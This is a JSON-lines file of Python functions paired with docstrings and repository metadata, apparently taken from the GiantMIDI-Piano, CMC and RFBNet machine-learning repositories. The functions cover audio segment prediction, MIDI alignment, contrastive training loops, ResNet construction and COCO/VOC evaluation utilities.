{"docstring": "\"\"\"Predict the probabilities of piano solo on 1-second segments.\n\"\"\"\n", "func_signal": "def predict(self, wav):\n", "code": "rms = np.sqrt(np.mean(wav ** 2))\nwav = wav / rms / 20\nduration = len(wav) / SR\n\nn_seg = int(duration / 1.00)\n\nmag_segs = []\nbatch_size = 32\n\nall_probs = []\nzero_locts = []\n\nfor i in np.arange(n_seg):\n    wav_seg = wav[i * SR : (i + 1) * SR + 1000]\n    \n    if np.sqrt(np.mean(wav_seg**2)) < 0.001:\n        zero_locts.append(i)\n    \n    mag, ang = wav2spec(wav_seg)\n    mag = mag[..., :DIM_T]\n    \n    mag_segs.append(mag)\n\n    if len(mag_segs) == batch_size or i == n_seg - 1:\n        probs = self.predict_seg(np.array(mag_segs))\n        all_probs.append(probs)\n        mag_segs = []\n\nall_probs = np.concatenate(all_probs)\nzero_locts = np.array(zero_locts)\n\nif len(zero_locts) > 0:\n    all_probs[zero_locts] = 0\n\nreturn all_probs", "path": "GiantMIDI-Piano/piano_detection_model.py", "commit_date": "2020-09-18 00:00:00", "repo_name": "bytedance/GiantMIDI-Piano", "stars": 1577, "license": "None", "language": "python", "size": 23124}
{"docstring": "\"\"\"\n1. Align MAESTRO pieces with sequenced MIDIs. \n2. Align transcribed pieces with sequenced MIDIs.\nThe alignment toolbox is based on [1].\n\n[1] Nakamura, E., Yoshii, K. and Katayose, H., 2017. Performance Error \nDetection and Post-Processing for Fast and Accurate Symbolic Music \nAlignment. In ISMIR (pp. 347-353).\n\"\"\"\n", "func_signal": "def align(args):\n", "code": "csv_path = 'midis_for_evaluation/groundtruth_maestro_giantmidi-piano.csv'\nalign_tools_dir = './AlignmentTool_v190813'\n\nos.makedirs('_tmp', exist_ok=True)\nos.makedirs('aligned_results', exist_ok=True)\n\nwith open(csv_path, 'r') as fr:\n    reader = csv.reader(fr, delimiter='\\t')\n    lines = list(reader)\n\nlines = lines[1:]   # Remove header\nalign_time = time.time()\n\nfor n, line in enumerate(lines):\n    [piece_name, gt_name, maestro_name, giantmidi_name] = line\n    print(n, piece_name)\n\n    # Copy MIDI files\n    cmd = 'cp \"midis_for_evaluation/ground_truth/{}\" \"{}/{}\"; '.format(gt_name, align_tools_dir, gt_name)\n    cmd += 'cp \"midis_for_evaluation/maestro/{}\" \"{}/{}\"; '.format(maestro_name, align_tools_dir, maestro_name)\n    cmd += 'cp \"midis_for_evaluation/giantmidi-piano/{}\" \"{}/{}\"; '.format(giantmidi_name, align_tools_dir, giantmidi_name)\n    print(cmd)\n    os.system(cmd)\n\n    # Align\n    cmd = 'cd {}; '.format(align_tools_dir)\n    cmd += './MIDIToMIDIAlign.sh {} {}; '.format(gt_name[0 : -4], maestro_name[0 : -4])\n    cmd += './MIDIToMIDIAlign.sh {} {}; '.format(gt_name[0 : -4], giantmidi_name[0 : -4])\n    cmd += 'cd ..; '\n    print(cmd)\n    os.system(cmd)\n\n    # Copy aligned results\n    cmd = 'cp {}/{}_corresp.txt aligned_results/{}_corresp.txt; '.format(\n        align_tools_dir, maestro_name[0 : -4], maestro_name[0 : -4])\n    cmd += 'cp {}/{}_corresp.txt aligned_results/{}_corresp.txt; '.format(\n        align_tools_dir, giantmidi_name[0 : -4], giantmidi_name[0 : -4])\n    print(cmd)\n    os.system(cmd)\n\nprint('Finished! {:.3f} s'.format(time.time() - align_time))", "path": "GiantMIDI-Piano/evaluate_transcribed_midis.py", "commit_date": "2020-09-18 00:00:00", "repo_name": "bytedance/GiantMIDI-Piano", "stars": 1577, "license": "None", "language": "python", "size": 23124}
{"docstring": "\"\"\"Calculate the piano solo probability of all downloaded mp3s, and append\nthe probability to the meta csv file.\n\"\"\"\n# Arguments & parameters\n", "func_signal": "def calculate_piano_solo_prob(args):\n", "code": "workspace = args.workspace \nmp3s_dir = args.mp3s_dir\nmini_data = args.mini_data\n\nsample_rate = piano_detection_model.SR\n\nif mini_data:\n    prefix = 'minidata_'\nelse:\n    prefix = ''\n\n# Paths\nsimilarity_csv_path = os.path.join(workspace, \n    '{}full_music_pieces_youtube_similarity.csv'.format(prefix))\n\npiano_prediction_path = os.path.join(workspace, \n    '{}full_music_pieces_youtube_similarity_pianosoloprob.csv'.format(prefix))\n\n# Meta info\nmeta_dict = read_csv_to_meta_dict(similarity_csv_path)\n\nmeta_dict['piano_solo_prob'] = []\nmeta_dict['audio_name'] = []\nmeta_dict['audio_duration'] = []\ncount = 0\n\npiano_solo_detector = piano_detection_model.PianoSoloDetector()\n\nfor n in range(len(meta_dict['surname'])):\n    mp3_path = os.path.join(mp3s_dir, '{}, {}, {}, {}.mp3'.format(\n        meta_dict['surname'][n], meta_dict['firstname'][n], \n        meta_dict['music'][n], meta_dict['youtube_id'][n]).replace('/', '_'))\n\n    if os.path.exists(mp3_path):\n        (audio, _) = librosa.core.load(mp3_path, sr=sample_rate, mono=True)\n        \n        try:\n            probs = piano_solo_detector.predict(audio)\n            prob = np.mean(probs)\n        except:\n            prob = 0\n\n        print(n, mp3_path, prob)\n        meta_dict['audio_name'].append(get_filename(mp3_path))\n        meta_dict['piano_solo_prob'].append(prob)\n        meta_dict['audio_duration'].append(len(audio) / sample_rate)\n    else:\n        meta_dict['piano_solo_prob'].append(0.)\n        meta_dict['audio_name'].append('')\n        meta_dict['audio_duration'].append(0.)\n\nwrite_meta_dict_to_csv(meta_dict, piano_prediction_path)\nprint('Write out to {}'.format(piano_prediction_path))", "path": "GiantMIDI-Piano/audios_to_midis.py", "commit_date": "2020-09-19 00:00:00", "repo_name": "bytedance/GiantMIDI-Piano", "stars": 1577, "license": "None", "language": "python", "size": 23124}
{"docstring": "\"\"\"Predict the probability of piano solo on each segment.\n\nArgs:\n  mag_seg: (batch_size, 1, F, T)\n\nReturns:\n  probs: (batch_size,)\n\"\"\"\n", "func_signal": "def predict_seg(self, mag_seg):\n", "code": "x = np.transpose(mag_seg, (0, 1, 3, 2))\ny = self.model.predict_on_batch(x)  # (batch_size, classes_num)\nprobs = y[:, 1]\nreturn probs", "path": "GiantMIDI-Piano/piano_detection_model.py", "commit_date": "2020-09-18 00:00:00", "repo_name": "bytedance/GiantMIDI-Piano", "stars": 1577, "license": "None", "language": "python", "size": 23124}
{"docstring": "\"\"\"Merge inversions of a chord.\n\nArgs:\n  sorted_list: list, e.g.,\n    [('{0}', 10497), ('{0, 3}', 1517), ('{0, 4}', 1302), ...]\n\nOutput:\n  merged_chord_dict: dict, .e.g.,\n    [{'{0}': 10497, '{0, 3}': 2763, '{0, 4}': 2182, ...]\n\"\"\"\n", "func_signal": "def _merge_inversion(sorted_list, chord_dict):\n", "code": "merged_chord_dict = {}\nfor pair in sorted_list:\n\n    inversions = _get_inversion_list(pair[0])\n    exist = False\n    for inv in inversions:\n        if inv in merged_chord_dict.keys():\n            exist = True\n            break\n\n    if not exist:\n        merged_chord_dict[pair[0]] = 0\n        for inversion in inversions:\n            if inversion in chord_dict.keys():\n                merged_chord_dict[pair[0]] += chord_dict[inversion]\n\nreturn merged_chord_dict", "path": "GiantMIDI-Piano/calculate_statistics.py", "commit_date": "2020-09-18 00:00:00", "repo_name": "bytedance/GiantMIDI-Piano", "stars": 1577, "license": "None", "language": "python", "size": 23124}
{"docstring": "\"\"\"Get chord list by their descending chord numer\n\nArgs:\n  chord_dict: dict, e.g., \n    {'{0}': 5872, '{0, 7}': 386, '{0, 2, 4, 5, 9, 10}': 2, '{0, 3}': 777, ...}\n\nReturns:\n  sorted_list: list, e.g.,\n    [('{0}', 10497), ('{0, 3}', 1517), ('{0, 4}', 1302), ...]\n\"\"\"\n", "func_signal": "def sort_dict(chord_dict):\n", "code": "sorted_list = [(key, chord_dict[key]) for key in chord_dict.keys()]\nsorted_list.sort(key=lambda e: e[1], reverse=True)\nreturn sorted_list", "path": "GiantMIDI-Piano/calculate_statistics.py", "commit_date": "2020-09-18 00:00:00", "repo_name": "bytedance/GiantMIDI-Piano", "stars": 1577, "license": "None", "language": "python", "size": 23124}
{"docstring": "\"\"\"Parse aligned results csv file to get results.\n\nArgs:\n  csv_path: str, aligned result path, e.g., xx_corresp.txt\n\nReturns:\n  stat_dict, dict, keys: true positive (TP), deletion (D), insertion (I), \n    substitution (S), error rate (ER), ground truth number (N)\n\"\"\"\n", "func_signal": "def get_stats(csv_path):\n", "code": "with open(csv_path, 'r') as fr:\n    reader = csv.reader(fr, delimiter='\\t')\n    lines = list(reader)\n\nlines = lines[1 :]\n\nTP, D, I, S = 0, 0, 0, 0\nalign_counter = []\nref_counter = []\n\nfor line in lines:\n    line = line[0 : -1]\n    [alignID, _, _, alignPitch, _, refID, _, _, refPitch, _] = line\n\n    if alignID != '*' and refID != '*':\n        if alignPitch == refPitch:\n            TP += 1\n        else:\n            S += 1\n\n    if alignID == '*':\n        D += 1\n\n    if refID == '*':\n        I += 1\n\nN = TP + D + S\nER = (D + I + S) / N\n\nprint('TP: {}, D: {}, I: {}, S: {}'.format(TP, D, I, S))\nprint('ER: {:.4f}'.format(ER))\n\nstat_dict = {'TP': TP, 'D': D, 'I': I, 'S': S, 'ER': ER, 'N': N}\nreturn stat_dict", "path": "GiantMIDI-Piano/evaluate_transcribed_midis.py", "commit_date": "2020-09-18 00:00:00", "repo_name": "bytedance/GiantMIDI-Piano", "stars": 1577, "license": "None", "language": "python", "size": 23124}
{"docstring": "\"\"\"Constructs a ResNet-18 model.\nArgs:\n    pretrained (bool): If True, returns a model pre-trained on ImageNet\n\"\"\"\n", "func_signal": "def resnet18(pretrained=False, **kwargs):\n", "code": "model = ResNet(BasicBlock, [2, 2, 2, 2], **kwargs)\nif pretrained:\n    model.load_state_dict(model_zoo.load_url(model_urls['resnet18']))\nreturn model", "path": "CMC/models/resnet.py", "commit_date": "2019-11-26 00:00:00", "repo_name": "HobbitLong/CMC", "stars": 1269, "license": "bsd-2-clause", "language": "python", "size": 76}
{"docstring": "\"\"\"Computes the accuracy over the k top predictions for the specified values of k\"\"\"\n", "func_signal": "def accuracy(output, target, topk=(1,)):\n", "code": "with torch.no_grad():\n    maxk = max(topk)\n    batch_size = target.size(0)\n\n    _, pred = output.topk(maxk, 1, True, True)\n    pred = pred.t()\n    correct = pred.eq(target.view(1, -1).expand_as(pred))\n\n    res = []\n    for k in topk:\n        correct_k = correct[:k].view(-1).float().sum(0, keepdim=True)\n        res.append(correct_k.mul_(100.0 / batch_size))\n    return res", "path": "CMC/util.py", "commit_date": "2019-06-14 00:00:00", "repo_name": "HobbitLong/CMC", "stars": 1269, "license": "bsd-2-clause", "language": "python", "size": 76}
{"docstring": "\"\"\"Constructs a ResNet-50 model.\nArgs:\n    pretrained (bool): If True, returns a model pre-trained on ImageNet\n\"\"\"\n", "func_signal": "def resnet50(pretrained=False, **kwargs):\n", "code": "model = ResNet(Bottleneck, [3, 4, 6, 3], **kwargs)\nif pretrained:\n    model.load_state_dict(model_zoo.load_url(model_urls['resnet50']))\nreturn model", "path": "CMC/models/resnet.py", "commit_date": "2019-11-26 00:00:00", "repo_name": "HobbitLong/CMC", "stars": 1269, "license": "bsd-2-clause", "language": "python", "size": 76}
{"docstring": "\"\"\"\none epoch training for instance discrimination\n\"\"\"\n\n", "func_signal": "def train_moco(epoch, train_loader, model, model_ema, contrast, criterion, optimizer, opt):\n", "code": "model.train()\nmodel_ema.eval()\n\ndef set_bn_train(m):\n    classname = m.__class__.__name__\n    if classname.find('BatchNorm') != -1:\n        m.train()\nmodel_ema.apply(set_bn_train)\n\nbatch_time = AverageMeter()\ndata_time = AverageMeter()\nloss_meter = AverageMeter()\nprob_meter = AverageMeter()\n\nend = time.time()\nfor idx, (inputs, _, index) in enumerate(train_loader):\n    data_time.update(time.time() - end)\n\n    bsz = inputs.size(0)\n\n    inputs = inputs.float()\n    if opt.gpu is not None:\n        inputs = inputs.cuda(opt.gpu, non_blocking=True)\n    else:\n        inputs = inputs.cuda()\n    index = index.cuda(opt.gpu, non_blocking=True)\n\n    # ===================forward=====================\n    x1, x2 = torch.split(inputs, [3, 3], dim=1)\n\n    # ids for ShuffleBN\n    shuffle_ids, reverse_ids = get_shuffle_ids(bsz)\n\n    feat_q = model(x1)\n    with torch.no_grad():\n        x2 = x2[shuffle_ids]\n        feat_k = model_ema(x2)\n        feat_k = feat_k[reverse_ids]\n\n    out = contrast(feat_q, feat_k)\n\n    loss = criterion(out)\n    prob = out[:, 0].mean()\n\n    # ===================backward=====================\n    optimizer.zero_grad()\n    if opt.amp:\n        with amp.scale_loss(loss, optimizer) as scaled_loss:\n            scaled_loss.backward()\n    else:\n        loss.backward()\n    optimizer.step()\n\n    # ===================meters=====================\n    loss_meter.update(loss.item(), bsz)\n    prob_meter.update(prob.item(), bsz)\n\n    moment_update(model, model_ema, opt.alpha)\n\n    torch.cuda.synchronize()\n    batch_time.update(time.time() - end)\n    end = time.time()\n\n    # print info\n    if (idx + 1) % opt.print_freq == 0:\n        print('Train: [{0}][{1}/{2}]\\t'\n              'BT {batch_time.val:.3f} ({batch_time.avg:.3f})\\t'\n              'DT {data_time.val:.3f} ({data_time.avg:.3f})\\t'\n              'loss {loss.val:.3f} ({loss.avg:.3f})\\t'\n              'prob {prob.val:.3f} ({prob.avg:.3f})'.format(\n               epoch, idx + 1, len(train_loader), batch_time=batch_time,\n               data_time=data_time, loss=loss_meter, prob=prob_meter))\n        print(out.shape)\n        sys.stdout.flush()\n\nreturn loss_meter.avg, prob_meter.avg", "path": "CMC/train_moco_ins.py", "commit_date": "2019-11-26 00:00:00", "repo_name": "HobbitLong/CMC", "stars": 1269, "license": "bsd-2-clause", "language": "python", "size": 76}
{"docstring": "# return optimizer\n", "func_signal": "def set_optimizer(args, model):\n", "code": "optimizer = torch.optim.SGD(model.parameters(),\n                            lr=args.learning_rate,\n                            momentum=args.momentum,\n                            weight_decay=args.weight_decay)\nreturn optimizer", "path": "CMC/train_CMC.py", "commit_date": "2019-12-06 00:00:00", "repo_name": "HobbitLong/CMC", "stars": 1269, "license": "bsd-2-clause", "language": "python", "size": 76}
{"docstring": "\"\"\"Constructs a ResNet-101 model.\nArgs:\n    pretrained (bool): If True, returns a model pre-trained on ImageNet\n\"\"\"\n", "func_signal": "def resnet101(pretrained=False, **kwargs):\n", "code": "model = ResNet(Bottleneck, [3, 4, 23, 3], **kwargs)\nif pretrained:\n    model.load_state_dict(model_zoo.load_url(model_urls['resnet101']))\nreturn model", "path": "CMC/models/resnet.py", "commit_date": "2019-11-26 00:00:00", "repo_name": "HobbitLong/CMC", "stars": 1269, "license": "bsd-2-clause", "language": "python", "size": 76}
{"docstring": "\"\"\"Constructs a ResNet-34 model.\nArgs:\n    pretrained (bool): If True, returns a model pre-trained on ImageNet\n\"\"\"\n", "func_signal": "def resnet34(pretrained=False, **kwargs):\n", "code": "model = ResNet(BasicBlock, [3, 4, 6, 3], **kwargs)\nif pretrained:\n    model.load_state_dict(model_zoo.load_url(model_urls['resnet34']))\nreturn model", "path": "CMC/models/resnet.py", "commit_date": "2019-11-26 00:00:00", "repo_name": "HobbitLong/CMC", "stars": 1269, "license": "bsd-2-clause", "language": "python", "size": 76}
{"docstring": "\"\"\"\none epoch training\n\"\"\"\n\n", "func_signal": "def train(epoch, train_loader, model, classifier, criterion, optimizer, opt):\n", "code": "model.eval()\nclassifier.train()\n\nbatch_time = AverageMeter()\ndata_time = AverageMeter()\nlosses = AverageMeter()\ntop1 = AverageMeter()\ntop5 = AverageMeter()\n\nend = time.time()\nfor idx, (input, target) in enumerate(train_loader):\n    # measure data loading time\n    data_time.update(time.time() - end)\n\n    if opt.gpu is not None:\n        input = input.cuda(opt.gpu, non_blocking=True)\n    input = input.float()\n    target = target.cuda(opt.gpu, non_blocking=True)\n\n    # ===================forward=====================\n    with torch.no_grad():\n        feat = model(input, opt.layer)\n        feat = feat.detach()\n\n    output = classifier(feat)\n    loss = criterion(output, target)\n\n    acc1, acc5 = accuracy(output, target, topk=(1, 5))\n    losses.update(loss.item(), input.size(0))\n    top1.update(acc1[0], input.size(0))\n    top5.update(acc5[0], input.size(0))\n\n    # ===================backward=====================\n    optimizer.zero_grad()\n    loss.backward()\n    optimizer.step()\n\n    # ===================meters=====================\n    batch_time.update(time.time() - end)\n    end = time.time()\n\n    # print info\n    if idx % opt.print_freq == 0:\n        print('Epoch: [{0}][{1}/{2}]\\t'\n              'Time {batch_time.val:.3f} ({batch_time.avg:.3f})\\t'\n              'Data {data_time.val:.3f} ({data_time.avg:.3f})\\t'\n              'Loss {loss.val:.4f} ({loss.avg:.4f})\\t'\n              'Acc@1 {top1.val:.3f} ({top1.avg:.3f})\\t'\n              'Acc@5 {top5.val:.3f} ({top5.avg:.3f})'.format(\n               epoch, idx, len(train_loader), batch_time=batch_time,\n               data_time=data_time, loss=losses, top1=top1, top5=top5))\n        sys.stdout.flush()\n\nreturn top1.avg, top5.avg, losses.avg", "path": "CMC/eval_moco_ins.py", "commit_date": "2019-11-26 00:00:00", "repo_name": "HobbitLong/CMC", "stars": 1269, "license": "bsd-2-clause", "language": "python", "size": 76}
{"docstring": "\"\"\"get the train loader\"\"\"\n", "func_signal": "def get_train_loader(args):\n", "code": "data_folder = os.path.join(args.data_folder, 'train')\n\nif args.view == 'Lab':\n    mean = [(0 + 100) / 2, (-86.183 + 98.233) / 2, (-107.857 + 94.478) / 2]\n    std = [(100 - 0) / 2, (86.183 + 98.233) / 2, (107.857 + 94.478) / 2]\n    color_transfer = RGB2Lab()\nelif args.view == 'YCbCr':\n    mean = [116.151, 121.080, 132.342]\n    std = [109.500, 111.855, 111.964]\n    color_transfer = RGB2YCbCr()\nelse:\n    raise NotImplemented('view not implemented {}'.format(args.view))\nnormalize = transforms.Normalize(mean=mean, std=std)\n\ntrain_transform = transforms.Compose([\n    transforms.RandomResizedCrop(224, scale=(args.crop_low, 1.)),\n    transforms.RandomHorizontalFlip(),\n    color_transfer,\n    transforms.ToTensor(),\n    normalize,\n])\ntrain_dataset = ImageFolderInstance(data_folder, transform=train_transform)\ntrain_sampler = None\n\n# train loader\ntrain_loader = torch.utils.data.DataLoader(\n    train_dataset, batch_size=args.batch_size, shuffle=(train_sampler is None),\n    num_workers=args.num_workers, pin_memory=True, sampler=train_sampler)\n\n# num of samples\nn_data = len(train_dataset)\nprint('number of samples: {}'.format(n_data))\n\nreturn train_loader, n_data", "path": "CMC/train_CMC.py", "commit_date": "2019-12-06 00:00:00", "repo_name": "HobbitLong/CMC", "stars": 1269, "license": "bsd-2-clause", "language": "python", "size": 76}
{"docstring": "\"\"\"\nset the learning rate\n\"\"\"\n", "func_signal": "def set_lr(optimizer, lr):\n", "code": "for param_group in optimizer.param_groups:\n    param_group['lr'] = lr", "path": "CMC/eval_moco_ins.py", "commit_date": "2019-11-26 00:00:00", "repo_name": "HobbitLong/CMC", "stars": 1269, "license": "bsd-2-clause", "language": "python", "size": 76}
{"docstring": "\"\"\" model_ema = m * model_ema + (1 - m) model \"\"\"\n", "func_signal": "def moment_update(model, model_ema, m):\n", "code": "for p1, p2 in zip(model.parameters(), model_ema.parameters()):\n    p2.data.mul_(m).add_(1-m, p1.detach().data)", "path": "CMC/train_moco_ins.py", "commit_date": "2019-11-26 00:00:00", "repo_name": "HobbitLong/CMC", "stars": 1269, "license": "bsd-2-clause", "language": "python", "size": 76}
{"docstring": "\"\"\"3x3 convolution with padding\"\"\"\n", "func_signal": "def conv3x3(in_planes, out_planes, stride=1):\n", "code": "return nn.Conv2d(in_planes, out_planes, kernel_size=3, stride=stride,\n                 padding=1, bias=False)", "path": "CMC/models/resnet.py", "commit_date": "2019-11-26 00:00:00", "repo_name": "HobbitLong/CMC", "stars": 1269, "license": "bsd-2-clause", "language": "python", "size": 76}
{"docstring": "\"\"\"\none epoch training for instance discrimination\n\"\"\"\n\n", "func_signal": "def train_ins(epoch, train_loader, model, contrast, criterion, optimizer, opt):\n", "code": "model.train()\n\nbatch_time = AverageMeter()\ndata_time = AverageMeter()\nloss_meter = AverageMeter()\nprob_meter = AverageMeter()\n\nend = time.time()\nfor idx, (inputs, _, index) in enumerate(train_loader):\n    data_time.update(time.time() - end)\n\n    bsz = inputs.size(0)\n\n    inputs = inputs.float()\n    if opt.gpu is not None:\n        inputs = inputs.cuda(opt.gpu, non_blocking=True)\n    else:\n        inputs = inputs.cuda()\n    index = index.cuda(opt.gpu, non_blocking=True)\n\n    # ===================forward=====================\n    feat = model(inputs)\n    out = contrast(feat, index)\n\n    loss = criterion(out)\n    prob = out[:, 0].mean()\n\n    # ===================backward=====================\n    optimizer.zero_grad()\n    if opt.amp:\n        with amp.scale_loss(loss, optimizer) as scaled_loss:\n            scaled_loss.backward()\n    else:\n        loss.backward()\n    optimizer.step()\n\n    # ===================meters=====================\n    loss_meter.update(loss.item(), bsz)\n    prob_meter.update(prob.item(), bsz)\n\n    torch.cuda.synchronize()\n    batch_time.update(time.time() - end)\n    end = time.time()\n\n    # print info\n    if (idx + 1) % opt.print_freq == 0:\n        print('Train: [{0}][{1}/{2}]\\t'\n              'BT {batch_time.val:.3f} ({batch_time.avg:.3f})\\t'\n              'DT {data_time.val:.3f} ({data_time.avg:.3f})\\t'\n              'loss {loss.val:.3f} ({loss.avg:.3f})\\t'\n              'prob {prob.val:.3f} ({prob.avg:.3f})'.format(\n               epoch, idx + 1, len(train_loader), batch_time=batch_time,\n               data_time=data_time, loss=loss_meter, prob=prob_meter))\n        print(out.shape)\n        sys.stdout.flush()\n\nreturn loss_meter.avg, prob_meter.avg", "path": "CMC/train_moco_ins.py", "commit_date": "2019-11-26 00:00:00", "repo_name": "HobbitLong/CMC", "stars": 1269, "license": "bsd-2-clause", "language": "python", "size": 76}
{"docstring": "\"\"\"Sets the learning rate to the initial LR decayed by 0.2 every steep step\"\"\"\n", "func_signal": "def adjust_learning_rate(epoch, opt, optimizer):\n", "code": "steps = np.sum(epoch > np.asarray(opt.lr_decay_epochs))\nif steps > 0:\n    new_lr = opt.learning_rate * (opt.lr_decay_rate ** steps)\n    for param_group in optimizer.param_groups:\n        param_group['lr'] = new_lr", "path": "CMC/util.py", "commit_date": "2019-06-14 00:00:00", "repo_name": "HobbitLong/CMC", "stars": 1269, "license": "bsd-2-clause", "language": "python", "size": 76}
{"docstring": "\"\"\"Computes the accuracy over the k top predictions for the specified values of k\"\"\"\n", "func_signal": "def accuracy(output, target, topk=(1,)):\n", "code": "with torch.no_grad():\n    maxk = max(topk)\n    batch_size = target.size(0)\n\n    _, pred = output.topk(maxk, 1, True, True)\n    pred = pred.t()\n    correct = pred.eq(target.view(1, -1).expand_as(pred))\n\n    res = []\n    for k in topk:\n        correct_k = correct[:k].view(-1).float().sum(0, keepdim=True)\n        res.append(correct_k.mul_(100.0 / batch_size))\n    return res", "path": "CMC/eval_moco_ins.py", "commit_date": "2019-11-26 00:00:00", "repo_name": "HobbitLong/CMC", "stars": 1269, "license": "bsd-2-clause", "language": "python", "size": 76}
{"docstring": "\"\"\"generate shuffle ids for ShuffleBN\"\"\"\n", "func_signal": "def get_shuffle_ids(bsz):\n", "code": "forward_inds = torch.randperm(bsz).long().cuda()\nbackward_inds = torch.zeros(bsz).long().cuda()\nvalue = torch.arange(bsz).long().cuda()\nbackward_inds.index_copy_(0, forward_inds, value)\nreturn forward_inds, backward_inds", "path": "CMC/train_moco_ins.py", "commit_date": "2019-11-26 00:00:00", "repo_name": "HobbitLong/CMC", "stars": 1269, "license": "bsd-2-clause", "language": "python", "size": 76}
{"docstring": "\"\"\"\nDraw N samples from multinomial\n:param N: number of samples\n:return: samples\n\"\"\"\n", "func_signal": "def draw(self, N):\n", "code": "K = self.alias.size(0)\n\nkk = torch.zeros(N, dtype=torch.long, device=self.prob.device).random_(0, K)\nprob = self.prob.index_select(0, kk)\nalias = self.alias.index_select(0, kk)\n# b is whether a random number is greater than q\nb = torch.bernoulli(prob)\noq = kk.mul(b.long())\noj = alias.mul((1-b).long())\n\nreturn oq + oj", "path": "CMC/NCE/alias_multinomial.py", "commit_date": "2019-06-14 00:00:00", "repo_name": "HobbitLong/CMC", "stars": 1269, "license": "bsd-2-clause", "language": "python", "size": 76}
{"docstring": "# set the model\n", "func_signal": "def set_model(args, n_data):\n", "code": "if args.model == 'alexnet':\n    model = MyAlexNetCMC(args.feat_dim)\nelif args.model.startswith('resnet'):\n    model = MyResNetsCMC(args.model)\nelse:\n    raise ValueError('model not supported yet {}'.format(args.model))\n\ncontrast = NCEAverage(args.feat_dim, n_data, args.nce_k, args.nce_t, args.nce_m, args.softmax)\ncriterion_l = NCESoftmaxLoss() if args.softmax else NCECriterion(n_data)\ncriterion_ab = NCESoftmaxLoss() if args.softmax else NCECriterion(n_data)\n\nif torch.cuda.is_available():\n    model = model.cuda()\n    contrast = contrast.cuda()\n    criterion_ab = criterion_ab.cuda()\n    criterion_l = criterion_l.cuda()\n    cudnn.benchmark = True\n\nreturn model, contrast, criterion_ab, criterion_l", "path": "CMC/train_CMC.py", "commit_date": "2019-12-06 00:00:00", "repo_name": "HobbitLong/CMC", "stars": 1269, "license": "bsd-2-clause", "language": "python", "size": 76}
{"docstring": "\"\"\"Constructs a ResNet-152 model.\nArgs:\n    pretrained (bool): If True, returns a model pre-trained on ImageNet\n\"\"\"\n", "func_signal": "def resnet152(pretrained=False, **kwargs):\n", "code": "model = ResNet(Bottleneck, [3, 8, 36, 3], **kwargs)\nif pretrained:\n    model.load_state_dict(model_zoo.load_url(model_urls['resnet152']))\nreturn model", "path": "CMC/models/resnet.py", "commit_date": "2019-11-26 00:00:00", "repo_name": "HobbitLong/CMC", "stars": 1269, "license": "bsd-2-clause", "language": "python", "size": 76}
{"docstring": "\"\"\"\nArgs:\n    index (int): Index\nReturns:\n    tuple: (image, target, index) where target is class_index of the target class.\n\"\"\"\n", "func_signal": "def __getitem__(self, index):\n", "code": "path, target = self.imgs[index]\nimage = self.loader(path)\nif self.transform is not None:\n    img = self.transform(image)\nif self.target_transform is not None:\n    target = self.target_transform(target)\n\nif self.two_crop:\n    img2 = self.transform(image)\n    img = torch.cat([img, img2], dim=0)\n\nreturn img, target, index", "path": "CMC/dataset.py", "commit_date": "2019-11-26 00:00:00", "repo_name": "HobbitLong/CMC", "stars": 1269, "license": "bsd-2-clause", "language": "python", "size": 76}
{"docstring": "\"\"\"\nConvert annotation which can be polygons, uncompressed RLE, or RLE to binary mask.\n:return: binary mask (numpy 2D array)\n\"\"\"\n", "func_signal": "def annToMask(self, ann):\n", "code": "rle = self.annToRLE(ann)\nm = maskUtils.decode(rle)\nreturn m", "path": "RFBNet/utils/pycocotools/coco.py", "commit_date": "2017-11-25 00:00:00", "repo_name": "GOATmessi7/RFBNet", "stars": 1390, "license": "mit", "language": "python", "size": 1916}
{"docstring": "\"\"\"\nfiltering parameters. default skips that filter.\n:param catNms (str array)  : get cats for given cat names\n:param supNms (str array)  : get cats for given supercategory names\n:param catIds (int array)  : get cats for given cat ids\n:return: ids (int array)   : integer array of cat ids\n\"\"\"\n", "func_signal": "def getCatIds(self, catNms=[], supNms=[], catIds=[]):\n", "code": "catNms = catNms if type(catNms) == list else [catNms]\nsupNms = supNms if type(supNms) == list else [supNms]\ncatIds = catIds if type(catIds) == list else [catIds]\n\nif len(catNms) == len(supNms) == len(catIds) == 0:\n    cats = self.dataset['categories']\nelse:\n    cats = self.dataset['categories']\n    cats = cats if len(catNms) == 0 else [cat for cat in cats if cat['name']          in catNms]\n    cats = cats if len(supNms) == 0 else [cat for cat in cats if cat['supercategory'] in supNms]\n    cats = cats if len(catIds) == 0 else [cat for cat in cats if cat['id']            in catIds]\nids = [cat['id'] for cat in cats]\nreturn ids", "path": "RFBNet/utils/pycocotools/coco.py", "commit_date": "2017-11-25 00:00:00", "repo_name": "GOATmessi7/RFBNet", "stars": 1390, "license": "mit", "language": "python", "size": 1916}
{"docstring": "\"\"\" ap = voc_ap(rec, prec, [use_07_metric])\nCompute VOC AP given precision and recall.\nIf use_07_metric is true, uses the\nVOC 07 11 point method (default:False).\n\"\"\"\n", "func_signal": "def voc_ap(rec, prec, use_07_metric=False):\n", "code": "if use_07_metric:\n    # 11 point metric\n    ap = 0.\n    for t in np.arange(0., 1.1, 0.1):\n        if np.sum(rec >= t) == 0:\n            p = 0\n        else:\n            p = np.max(prec[rec >= t])\n        ap = ap + p / 11.\nelse:\n    # correct AP calculation\n    # first append sentinel values at the end\n    mrec = np.concatenate(([0.], rec, [1.]))\n    mpre = np.concatenate(([0.], prec, [0.]))\n\n    # compute the precision envelope\n    for i in range(mpre.size - 1, 0, -1):\n        mpre[i - 1] = np.maximum(mpre[i - 1], mpre[i])\n\n    # to calculate area under PR curve, look for points\n    # where X axis (recall) changes value\n    i = np.where(mrec[1:] != mrec[:-1])[0]\n\n    # and sum (\\Delta recall) * prec\n    ap = np.sum((mrec[i + 1] - mrec[i]) * mpre[i + 1])\nreturn ap", "path": "RFBNet/data/voc_eval.py", "commit_date": "2017-11-25 00:00:00", "repo_name": "GOATmessi7/RFBNet", "stars": 1390, "license": "mit", "language": "python", "size": 1916}
{"docstring": "'''Returns the original image at an index in tensor form\n\nNote: not using self.__getitem__(), as any transformations passed in\ncould mess up this functionality.\n\nArgument:\n    index (int): index of img to show\nReturn:\n    tensorized version of img, squeezed\n'''\n", "func_signal": "def pull_tensor(self, index):\n", "code": "to_tensor = transforms.ToTensor()\nreturn torch.Tensor(self.pull_image(index)).unsqueeze_(0)", "path": "RFBNet/data/coco.py", "commit_date": "2017-11-25 00:00:00", "repo_name": "GOATmessi7/RFBNet", "stars": 1390, "license": "mit", "language": "python", "size": 1916}
